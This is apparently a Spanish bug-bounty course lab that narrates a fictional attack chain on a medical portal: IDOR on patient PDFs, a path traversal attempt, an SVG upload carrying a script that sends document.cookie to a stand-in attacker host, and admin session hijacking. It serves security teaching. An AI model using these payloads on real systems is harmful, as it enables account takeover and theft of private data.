# Lab 07.1 - Cazando Bugs (Mentalidad de Bug Bounty)

## 🎯 Objetivo
Unir múltiples vulnerabilidades aisladas (vistas en las notas del módulo) en un solo escenario de ataque estructurado.
En el Hacking real (y en los programas de recompensas / Bug Bounty), encontrar un "XSS que tira un cartelito emergente" vale muy poco ($50). 
Pero si combinás ese XSS, con una mala configuración lógica, podés lograr el famoso **Account Takeover (Toma de cuenta de la víctima)** y cobrar miles de dólares.

---

## 📋 El Escenario: La Plataforma Médica

Sos un Bug Hunter auditando una web ficticia: `www.salud-privada.com`.
Sos un paciente normal y creaste tu propia cuenta de prueba.
A simple vista, el panel no tiene ningún error.

### Descubrimiento (Fase 1): Analizando el Tráfico
Abrís tu herramienta (Burp Suite) e interceptás los botones de tu propio perfil. 
Notás que cuando le hacés clic al botón de *"Descargar mis últimos análisis"*, tu navegador envía la siguiente petición:
> `GET /api/descargas?file=analisis-299.pdf`

¡Una bandera roja! La aplicación no usa IDs robustos ni bloquea rutas de archivos. Esto huele a Inclusión de Archivos.
Probás hacer el clásico ataque de Directory Traversal inyectando `../../../../etc/passwd`.
**Falla.** La página te escupe: *"Error: Símbolos no permitidos"*. El Firewall Web (WAF) te bloqueó.

### El Bypass y el IDOR (Fase 2):
Volvés a mirar la petición original. Ves el número `299`.
Decidís que, si no podés saltar directorios, tal vez puedas pedir otro archivo PDF legítimo.
Mandás la petición al servidor editando el número con tu teclado:
> `GET /api/descargas?file=analisis-298.pdf`

La petición demora 1 segundo y... **¡Éxito!** Te descarga el análisis de sangre de otro paciente.
Has descubierto una vulnerabilidad **IDOR (Broken Access Control)** severa, debido a la previsibilidad numérica.
*Recompensa estimada: $1.000.*

---

## 🔗 Elevando el Ataque (Chaining Vulnerabilities)

No te querés quedar con $1,000. Querés hackear al Administrador del hospital (Account Takeover total) para cobrar el premio gordo.

### XSS en los Comentarios (Fase 3)
Te vas a la pestaña de *"Soporte Técnico"*. Escribís un ticket falso de queja para que lo lea el Administrador.
En el cuerpo del mensaje, inyectás un código de JavaScript que dice:
`<script> fetch('http://tu-servidor-hacker.com/?galleta=' + document.cookie); </script>`
Lo enviás.
**Falla.** El servidor limpia las etiquetas `<script>` antes de guardarlo en la Base de Datos. No pudiste clavar tu **XSS Almacenado**.

### El Descubrimiento del Vector (Fase 4): SVG Upload
Revisás tu sección de "Foto de perfil".
La aplicación no te permite subir archivos `.jpg` pesados. Solo te deja subir el logo de tu perfil en formato `.svg` (Vectores).
*(Dato del Hacker: El formato SVG no es una foto real hecha de píxeles, es un archivo de texto con código XML que le dice al navegador cómo dibujar las líneas).*

En tu computadora local, abrís el bloc de notas, creas una imagen SVG falsa, pero adentro de las líneas XML escondés secretamente la etiqueta maliciosa del XSS:
```xml
<svg>
  <script>fetch('http://hacker.com/robar?k=' + document.cookie);</script>
</svg>
```
Subís tu imagen SVG de perfil al portal médico. ¡El Backend la acepta porque tiene extensión `.svg` válida!

### El Disparo Final (Fase 5 - Engaño)
1. Te vas al foro de Soporte.
2. Le escribís un mensaje público al Administrador: *"Hola Admin. No puedo ver mi foto de perfil, creo que se rompió. Mi link es este: `www.salud-privada.com/usuario/mi_foto.svg`"*
3. El Administrador, logueado en la página del hospital (con Cookies nivel Dios), entra al ticket.
4. Hace clic en el enlace de tu foto para ayudarte.
5. Su navegador Google Chrome intenta pintar las líneas del SVG. En medio de la pintura, Chrome se choca con el código JavaScript incrustado (`<script>`).
6. El navegador obedece. Extrae las Cookies hiper-privilegiadas del Administrador y te las envía a tu servidor remoto por atrás, sin que el administrador note nada raro.
7. Agarrás esa Cookie. Te la ponés en tu navegador. Actualizás la página... y ahora tenés el botón de **"Eliminar Usuarios"** y **"Cerrar Hospital"**. Has ganado.

---

## 📝 Conclusión del Laboratorio

Este laboratorio mental demuestra la realidad del Bug Bounty. 
Las vulnerabilidades catastróficas únicas y mágicas (como la de la Inyección SQL `' OR 1=1 --`) ya casi no existen porque los lenguajes de programación las protegen solas.
La maestría del Hacker reside en:
1. Encontrar pequeños fallos lógicos aislados (El IDOR del PDF, el SVG malicioso).
2. "Encadenarlos" (Chaining) usando Ingeniería Social y conocimiento del Frontend.
3. Lograr el impacto crítico (Account Takeover).

**➡️ Siguiente nota:** [[13 - Ejercicios]]
